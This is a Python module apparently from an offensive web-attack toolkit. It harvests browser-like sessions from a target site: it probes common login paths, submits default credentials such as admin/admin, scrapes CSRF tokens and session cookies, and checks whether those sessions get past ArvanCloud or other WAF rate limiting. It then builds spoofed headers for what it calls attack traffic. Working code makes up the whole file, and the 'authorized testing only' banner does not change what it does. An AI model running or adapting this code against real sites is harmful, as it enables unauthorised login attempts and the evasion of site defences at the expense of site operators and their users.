#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║  Session Harvester — VF_EVASION Module                                  ║
║  Obtain real browser-like sessions for attacks                          ║
║                                                                          ║
║  WAFs and CDNs like ArvanCloud may rate-limit or challenge requests     ║
║  that lack valid session cookies. This module:                           ║
║  - Opens real sessions with the target                                   ║
║  - Collects cookies, CSRF tokens, session IDs                            ║
║  - Attempts common credentials to get authenticated sessions             ║
║  - Maintains sessions by periodic refresh                                ║
║  - Generates session-like headers for attack traffic                     ║
║                                                                          ║
║  FOR AUTHORIZED TESTING ONLY!                                            ║
╚═══════════════════════════════════════════════════════════════════════════╝
"""

import asyncio
import time
import random
import re
import ssl
from typing import Dict, List, Tuple
from collections import deque
from urllib.parse import urlparse, urljoin

from config.defaults import SESSION_REFRESH_INTERVAL, SESSION_HARVEST_PAGES_MAX, SESSION_HARVEST_CONNECTOR_LIMIT, SESSION_HARVEST_FORM_LIMIT
from vf_common import C, ssl_param
from utils.response_helpers import safe_read_text
from utils.session_helpers import scanner_timeout
from logging_config import get_logger
logger = get_logger(__name__)

try:
    import aiohttp
    HAS_AIOHTTP = True
except ImportError:
    HAS_AIOHTTP = False


# ═══════════════════════════════════════════════════════════════════════════════
# Color Codes
# ═══════════════════════════════════════════════════════════════════════════════


# ═══════════════════════════════════════════════════════════════════════════════
# Default Credentials for Session Harvesting (loaded from config if available)
# ═══════════════════════════════════════════════════════════════════════════════

# SEC-011: Credentials are no longer hardcoded in source code.
# Load from external JSON file or environment variable.
# Fallback to minimal defaults only when no external config exists.

_DEFAULT_CREDENTIALS = [
    ("admin", "admin"),
    ("test", "test"),
]


def _load_credentials() -> List[tuple]:
    """Load credentials from external config file or environment variable.

    Priority:
        1. STORM_VX_CREDENTIALS env var (JSON format: [["user","pass"], ...])
        2. credentials.json in project root
        3. Built-in minimal defaults

    Returns:
        List of (username, password) tuples.
    """
    import os as _os
    import json as _json

    # 1. Environment variable (JSON format)
    env_creds = _os.environ.get("STORM_VX_CREDENTIALS")
    if env_creds:
        try:
            parsed = _json.loads(env_creds)
            if isinstance(parsed, list) and len(parsed) > 0:
                return [(str(c[0]), str(c[1])) for c in parsed if isinstance(c, (list, tuple)) and len(c) >= 2]
        except (_json.JSONDecodeError, TypeError, IndexError):
            logger.warning("STORM_VX_CREDENTIALS env var contains invalid JSON")

    # 2. External credentials file
    _project_root = _os.path.dirname(_os.path.dirname(_os.path.abspath(__file__)))
    cred_path = _os.path.join(_project_root, "credentials.json")
    if _os.path.exists(cred_path):
        try:
            with open(cred_path, "r") as f:
                parsed = _json.load(f)
            if isinstance(parsed, list) and len(parsed) > 0:
                creds = [(str(c[0]), str(c[1])) for c in parsed if isinstance(c, (list, tuple)) and len(c) >= 2]
                if creds:
                    return creds
        except (_json.JSONDecodeError, OSError, TypeError, IndexError) as e:
            logger.debug(f"credentials.json load failed: {e}")

    # 3. Fallback to minimal defaults
    return _DEFAULT_CREDENTIALS


COMMON_CREDENTIALS = _load_credentials()

# Session cookie names by framework
SESSION_COOKIE_PATTERNS = [
    "PHPSESSID", "sessionid", "laravel_session", "XSRF-TOKEN",
    "ASP.NET_SessionId", "ASPSESSIONID", "JSESSIONID",
    "_session_id", "csrftoken", "session", "connect.sid",
    "sid", "SACSID", "hsessionid", "JROUTE",
    "__cf_bm", "cf_clearance",  # Cloudflare
    "arvan_sess", "arvancloud",  # ArvanCloud specific
]

# Login page paths
LOGIN_PATHS = [
    "/login", "/signin", "/auth/login", "/admin/login",
    "/wp-login.php", "/administrator/", "/admin/",
    "/user/login", "/account/login", "/auth/signin",
    "/api/login", "/api/auth/login",
]


class SessionHarvester:
    """
    Session Harvesting — obtain real browser-like sessions for attacks.

    Opens a real session with the target:
    1. GET homepage — collect initial cookies
    2. Follow any redirects
    3. GET login page — collect CSRF tokens
    4. POST login with common test credentials
    5. If login fails, still use the session cookies — may bypass rate limiting
    6. GET a few pages to build up cookie profile

    Maintains sessions by periodic refresh. Stores cookies in memory,
    auto-refreshes when about to expire.
    """

    def __init__(self, url: str, timeout: int = 15, verify_ssl: bool = True):
        """
        Args:
            url: Target URL
            timeout: Request timeout in seconds (Iran internet default: 15)
            verify_ssl: Whether to verify SSL certificates.
        """
        self.url = url
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        parsed = urlparse(url)
        self.domain = parsed.netloc.split(':')[0]
        self.scheme = parsed.scheme
        self.base_url = f"{parsed.scheme}://{parsed.netloc}"

        # Session storage
        self._cookies: Dict[str, str] = {}
        self._csrf_token: str | None = None
        self._csrf_field_name: str = "csrfmiddlewaretoken"
        self._session_id: str | None = None
        self._user_agent: str = random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        ])
        self._authenticated: bool = False
        self._login_path: str | None = None
        self._username_field: str = "username"
        self._password_field: str = "password"

        # Session maintenance
        self._last_refresh: float = 0
        self._refresh_interval: float = SESSION_REFRESH_INTERVAL  # W2.4
        self._session_expiry: float | None = None
        self._pages_visited: deque = deque(maxlen=SESSION_HARVEST_PAGES_MAX)  # W2.4

        # Stats
        self._cookies_collected: int = 0
        self._pages_crawled: int = 0
        self._login_attempts: int = 0
        self._login_success: bool = False

    async def harvest(self) -> Dict:
        """
        Harvest a session from the target.

        Returns:
            Dict with keys: cookies, token, session_id, user_agent, success
        """
        logger.info(f"[SESSION] Harvesting session from {self.domain}...")

        if not HAS_AIOHTTP:
            logger.error("aiohttp not installed — session harvesting unavailable")
            return None

        timeout_cfg = scanner_timeout(total=self.timeout)

        # Create a cookie jar that persists across requests
        cookie_jar = aiohttp.CookieJar(unsafe=True)

        try:
            connector = aiohttp.TCPConnector(ssl=ssl_param(self.verify_ssl), limit=SESSION_HARVEST_CONNECTOR_LIMIT)  # W2.4
            async with aiohttp.ClientSession(
                timeout=timeout_cfg,
                cookie_jar=cookie_jar,
                connector=connector,
            ) as session:
                # ── Step 1: GET homepage — collect initial cookies ──
                await self._step_homepage(session)

                # ── Step 2: Find and GET login page — collect CSRF tokens ──
                await self._step_find_login(session)

                # ── Step 3: Attempt login with common credentials ──
                if self._login_path:
                    await self._step_attempt_login(session)

                # ── Step 4: Crawl a few pages to build cookie profile ──
                await self._step_build_profile(session)

                # ── Step 5: Test if session cookies bypass rate limiting ──
                await self._step_test_bypass(session)

        except (aiohttp.ClientError, asyncio.TimeoutError, OSError, ssl.SSLError) as e:
            logger.warning(f"[SESSION] Harvest error: {e}")

        # Collect final cookies from jar
        self._collect_cookies_from_jar(cookie_jar)

        self._last_refresh = time.time()

        result = {
            "cookies": dict(self._cookies),
            "token": self._csrf_token or "",
            "session_id": self._session_id or "",
            "user_agent": self._user_agent,
            "success": len(self._cookies) > 0,
        }

        logger.info(f"[SESSION] Harvest complete — {len(self._cookies)} cookies, "
              f"session={self._session_id[:12] + '...' if self._session_id else 'none'}")

        return result

    async def _step_homepage(self, session: aiohttp.ClientSession):
        """Step 1: GET homepage, collect initial cookies."""
        logger.info(f"[SESSION] Step 1: GET homepage...")

        try:
            headers = self._base_headers()
            async with session.get(self.url, headers=headers, allow_redirects=True) as resp:
                body = await safe_read_text(resp)  # W1.10: bounded read
                self._pages_visited.append(self.url)
                self._pages_crawled += 1

                # Extract initial cookies
                self._extract_cookies(session)
                self._extract_csrf_from_html(body)

                logger.info(f"Homepage: status={resp.status}, "
                      f"cookies={len(self._cookies)}, size={len(body):,}B")

                # Find login links in homepage
                self._find_login_links(body)

        except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as e:
            logger.warning(f"Homepage error: {e}")

    async def _step_find_login(self, session: aiohttp.ClientSession):
        """Step 2: Find and GET login page, collect CSRF tokens."""
        if not self._login_path:
            # Try common login paths
            for path in LOGIN_PATHS:
                login_url = urljoin(self.base_url, path)
                try:
                    headers = self._base_headers()
                    async with session.get(login_url, headers=headers, allow_redirects=True) as resp:
                        if resp.status < 400:
                            body = await safe_read_text(resp)  # W1.10: bounded read
                            self._login_path = path
                            self._pages_crawled += 1
                            self._extract_cookies(session)
                            self._extract_csrf_from_html(body)
                            self._detect_login_fields(body)

                            logger.info(f"Login page found: {path} (status={resp.status})")
                            break
                except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as e:
                    logger.debug(f"Login page crawl error for {path}: {e}")
                    continue
        else:
            # We already found a login link from the homepage
            login_url = urljoin(self.base_url, self._login_path)
            try:
                headers = self._base_headers()
                async with session.get(login_url, headers=headers, allow_redirects=True) as resp:
                    if resp.status < 400:
                        body = await safe_read_text(resp)  # W1.10: bounded read
                        self._pages_crawled += 1
                        self._extract_cookies(session)
                        self._extract_csrf_from_html(body)
                        self._detect_login_fields(body)
                        logger.info(f"Login page loaded: {self._login_path}")
            except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as e:
                logger.warning(f"Login page error: {e}")

    async def _step_attempt_login(self, session: aiohttp.ClientSession):
        """Step 3: Try logging in with common credentials."""
        logger.info(f"[SESSION] Step 3: Attempting login...")

        login_url = urljoin(self.base_url, self._login_path)
        headers = self._base_headers()
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        headers["Referer"] = login_url
        headers["Origin"] = self.base_url

        for username, password in COMMON_CREDENTIALS[:6]:  # Try top 6
            self._login_attempts += 1

            form_data = {
                self._username_field: username,
                self._password_field: password,
            }

            # Add CSRF token if found
            if self._csrf_token:
                form_data[self._csrf_field_name] = self._csrf_token

            # Add hidden fields for ASP.NET
            form_data.setdefault("__VIEWSTATE", "")
            form_data.setdefault("__EVENTVALIDATION", "")

            try:
                async with session.post(
                    login_url, headers=headers, data=form_data,
                    allow_redirects=False
                ) as resp:
                    self._extract_cookies(session)

                    if resp.status in (301, 302):
                        # Redirect after login usually means success
                        location = resp.headers.get("Location", "")
                        if "dashboard" in location.lower() or "home" in location.lower() or "admin" in location.lower():
                            self._authenticated = True
                            self._login_success = True
                            logger.info(f"Login SUCCESS: {username}:{password} → {location}")

                            # Follow redirect to get session cookies
                            if location:
                                redirect_url = urljoin(login_url, location)
                                try:
                                    async with session.get(redirect_url, headers=self._base_headers()) as r:
                                        self._extract_cookies(session)
                                        self._pages_crawled += 1
                                except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as e:
                                    logger.debug(f"Redirect follow error: {e}")
                            break
                        else:
                            # Redirect but not to dashboard — maybe failed
                            pass

                    elif resp.status == 200:
                        body = await safe_read_text(resp)  # W1.10: bounded read
                        # Check if login page reloads (failure) or different page (success)
                        if "login" not in body.lower()[:2000] or "welcome" in body.lower() or "dashboard" in body.lower():
                            self._authenticated = True
                            self._login_success = True
                            logger.info(f"Login SUCCESS: {username}:{password}")
                            break

                    # Rate limit detection (ArvanCloud uses 500 too)
                    if resp.status in (403, 429, 500, 503):
                        logger.error(f"Rate limited during login attempt, slowing down...")
                        await asyncio.sleep(2)

                    # Rotate CSRF token
                    self._extract_csrf_from_html(await safe_read_text(resp) if resp.status == 200 else "")  # W1.10: bounded read

            except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as e:
                logger.error(f"Login attempt error: {e}")
                await asyncio.sleep(1)

            await asyncio.sleep(random.uniform(0.5, 1.5))  # Natural delay between attempts

        if not self._login_success:
            logger.error(f"Login failed for all attempts — using unauthenticated session cookies")

    async def _step_build_profile(self, session: aiohttp.ClientSession):
        """Step 4: Crawl a few pages to build up cookie profile."""
        logger.info(f"[SESSION] Step 4: Building cookie profile...")

        browse_paths = ["/", "/about", "/contact", "/faq", "/products", "/blog", "/news"]
        for path in browse_paths[:4]:
            url = urljoin(self.base_url, path)
            try:
                headers = self._base_headers()
                headers["Referer"] = self._pages_visited[-1] if self._pages_visited else self.base_url
                async with session.get(url, headers=headers, allow_redirects=True) as resp:
                    self._extract_cookies(session)
                    self._pages_visited.append(url)
                    self._pages_crawled += 1

                    if resp.status in (403, 429, 500, 503):
                        break  # Stop if getting blocked

                    await asyncio.sleep(random.uniform(0.3, 1.0))
            except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as e:
                logger.debug(f"Page crawl error: {e}")
                await asyncio.sleep(0.5)

        logger.info(f"Profile built: {len(self._cookies)} cookies, {self._pages_crawled} pages")

    async def _step_test_bypass(self, session: aiohttp.ClientSession):
        """Step 5: Test if session cookies bypass ArvanCloud rate limiting."""
        logger.info(f"[SESSION] Step 5: Testing rate limit bypass...")

        # Send 5 rapid requests to see if cookies help bypass rate limiting
        blocked = 0
        for i in range(5):
            try:
                headers = self._base_headers()
                async with session.get(self.url, headers=headers) as resp:
                    # ArvanCloud: 500 = block, 403 = direct block, 429 = rate limit
                    if resp.status in (403, 429, 500, 503):
                        blocked += 1
            except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as e:
                logger.debug(f"Bypass test request error: {e}")
                blocked += 1

            await asyncio.sleep(0.1)

        if blocked == 0:
            logger.info(f"Session bypasses rate limiting (0/5 blocked)")
        elif blocked <= 2:
            logger.info(f"Session partially bypasses rate limiting ({blocked}/5 blocked)")
        else:
            logger.error(f"Session does NOT bypass rate limiting ({blocked}/5 blocked)")

    async def maintain_session(self, cookies: dict) -> Dict:
        """
        Refresh an existing session. Returns updated cookies.

        Args:
            cookies: Current cookie dict to refresh

        Returns:
            Updated cookies dict
        """
        now = time.time()

        # Check if refresh is needed
        if self._last_refresh > 0 and (now - self._last_refresh) < self._refresh_interval:
            if self._cookies:
                return dict(self._cookies)

        logger.info(f"[SESSION] Refreshing session...")

        timeout_cfg = scanner_timeout(total=self.timeout)
        cookie_jar = aiohttp.CookieJar(unsafe=True)

        try:
            connector = aiohttp.TCPConnector(ssl=ssl_param(self.verify_ssl), limit=SESSION_HARVEST_FORM_LIMIT)  # W2.4
            async with aiohttp.ClientSession(
                timeout=timeout_cfg,
                cookie_jar=cookie_jar,
                connector=connector,
            ) as session:
                # Set existing cookies
                for name, value in cookies.items():
                    session.cookie_jar.update_cookies(
                        {name: value},
                        response_url=aiohttp.helpers.URL(self.url) if hasattr(aiohttp.helpers, 'URL') else None,
                    )

                # Refresh by visiting a page
                headers = self._base_headers()
                headers["Referer"] = self.url
                async with session.get(self.url, headers=headers, allow_redirects=True) as resp:
                    self._extract_cookies(session)
                    self._pages_crawled += 1

                    if resp.status in (403, 429, 500, 503):
                        logger.warning(f"[SESSION] Session refresh blocked (status={resp.status}), re-harvesting...")
                        await self.harvest()
                        # BUG-FIX v33: Return consistent type (Dict[str, str] = cookie map).
                        # Previously returned harvest() result which has a different dict
                        # shape (keys: cookies, token, session_id, user_agent, success),
                        # violating the method's API contract.
                        return dict(self._cookies)

        except (aiohttp.ClientError, asyncio.TimeoutError, OSError, ssl.SSLError) as e:
            logger.warning(f"[SESSION] Refresh error: {e}, re-harvesting...")
            await self.harvest()
            # BUG-FIX v33: Same as above — return consistent type.
            return dict(self._cookies)

        self._last_refresh = time.time()

        # Merge cookies
        merged = dict(cookies)
        merged.update(self._cookies)

        return merged

    async def get_session_headers(self) -> Dict[str, str]:
        """
        Get headers with valid session cookies for attack requests.

        Returns:
            Dict of headers including Cookie, Referer, Origin
        """
        # Check if session needs refresh
        if self._session_expiry and time.time() > self._session_expiry:
            await self.maintain_session(self._cookies)

        headers = self._base_headers()

        # Add cookie header
        if self._cookies:
            cookie_str = "; ".join(f"{k}={v}" for k, v in self._cookies.items())
            headers["Cookie"] = cookie_str

        # Add CSRF token if available
        if self._csrf_token:
            headers["X-CSRF-Token"] = self._csrf_token

        # Add authorization if authenticated
        if self._authenticated:
            headers["Authorization"] = f"Bearer {self._session_id or 'session'}"

        return headers

    def _base_headers(self) -> Dict[str, str]:
        """Generate base browser-like headers."""
        return {
            "User-Agent": self._user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9,fa;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "DNT": "1",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Dest": "document",
            "Cache-Control": "max-age=0",
        }

    def _extract_cookies(self, session: aiohttp.ClientSession):
        """Extract cookies from the session's cookie jar."""
        try:
            from yarl import URL as YarlURL
            for cookie in session.cookie_jar.filter_cookies(YarlURL(self.url)).values():
                self._cookies[cookie.key] = cookie.value
                # Check for session cookies
                if cookie.key.lower() in [s.lower() for s in SESSION_COOKIE_PATTERNS]:
                    self._session_id = cookie.value
                    if cookie.key in ("PHPSESSID", "sessionid", "JSESSIONID",
                                      "ASP.NET_SessionId", "_session_id"):
                        self._session_expiry = time.time() + 1800  # Assume 30 min expiry
        except (AttributeError, TypeError) as e:
            logger.debug(f"Cookie extraction from response failed: {e}")
            try:
                for cookie in session.cookie_jar:
                    self._cookies[cookie.key] = cookie.value
                    if cookie.key.lower() in [s.lower() for s in SESSION_COOKIE_PATTERNS]:
                        self._session_id = cookie.value
            except (AttributeError, TypeError) as e2:
                logger.debug(f"Cookie extraction from jar fallback failed: {e2}")

    def _collect_cookies_from_jar(self, jar: aiohttp.CookieJar):
        """Final cookie collection from jar."""
        try:
            for cookie in jar:
                self._cookies[cookie.key] = cookie.value
                self._cookies_collected += 1
        except (AttributeError, TypeError) as e:
            logger.debug(f"Cookie jar collection failed: {e}")

    def _extract_csrf_from_html(self, html: str):
        """Extract CSRF token from HTML response."""
        if not html:
            return

        # Django-style
        m = re.search(r'name=["\']csrfmiddlewaretoken["\']\s+value=["\']([^"\']+)["\']', html)
        if m:
            self._csrf_token = m.group(1)
            self._csrf_field_name = "csrfmiddlewaretoken"
            return

        # Laravel-style (meta tag)
        m = re.search(r'<meta\s+name=["\']csrf-token["\']\s+content=["\']([^"\']+)["\']', html)
        if m:
            self._csrf_token = m.group(1)
            self._csrf_field_name = "_token"
            return

        # Generic hidden input
        m = re.search(r'name=["\'](_token|csrf_token|authenticity_token|_csrf)["\'][^>]*value=["\']([^"\']+)["\']', html)
        if m:
            self._csrf_field_name = m.group(1)
            self._csrf_token = m.group(2)
            return

        # Reversed order
        m = re.search(r'value=["\']([^"\']+)["\'][^>]*name=["\'](_token|csrf_token|authenticity_token|_csrf)["\']', html)
        if m:
            self._csrf_token = m.group(1)
            self._csrf_field_name = m.group(2)
            return

    def _detect_login_fields(self, html: str):
        """Detect login form field names."""
        if not html:
            return

        # Username field
        patterns_user = [
            r'name=["\']?([^"\'>\s]*(?:[Uu]ser|[Ee]mail|[Ll]ogin)[^"\'>\s]*)["\']?',
        ]
        for p in patterns_user:
            m = re.search(p, html)
            if m:
                self._username_field = m.group(1)
                break

        # Password field
        patterns_pass = [
            r'name=["\']?([^"\'>\s]*(?:[Pp]ass|[Pp]wd)[^"\'>\s]*)["\']?',
        ]
        for p in patterns_pass:
            m = re.search(p, html)
            if m:
                self._password_field = m.group(1)
                break

    def _find_login_links(self, html: str):
        """Find login links in HTML."""
        if not html:
            return

        login_patterns = [
            r'href=["\']([^"\']*(?:login|signin|auth)[^"\']*)["\']',
            r'action=["\']([^"\']*(?:login|signin|auth)[^"\']*)["\']',
        ]

        for pattern in login_patterns:
            for m in re.finditer(pattern, html, re.IGNORECASE):
                link = m.group(1)
                if link.startswith('/'):
                    self._login_path = link
                    return
                elif self.domain in link:
                    parsed = urlparse(link)
                    self._login_path = parsed.path
                    return

    @property
    def is_authenticated(self) -> bool:
        """Whether an authenticated session was obtained."""
        return self._authenticated

    @property
    def has_session(self) -> bool:
        """Whether any session cookies were obtained."""
        return len(self._cookies) > 0

    def get_cookie_string(self) -> str:
        """Get cookies as a single Cookie header string."""
        return "; ".join(f"{k}={v}" for k, v in self._cookies.items())

    def get_stats(self) -> Dict:
        """Get session harvesting statistics."""
        return {
            "cookies_count": len(self._cookies),
            "has_csrf": self._csrf_token is not None,
            "is_authenticated": self._authenticated,
            "login_attempts": self._login_attempts,
            "pages_crawled": self._pages_crawled,
            "session_id_present": self._session_id is not None,
        }
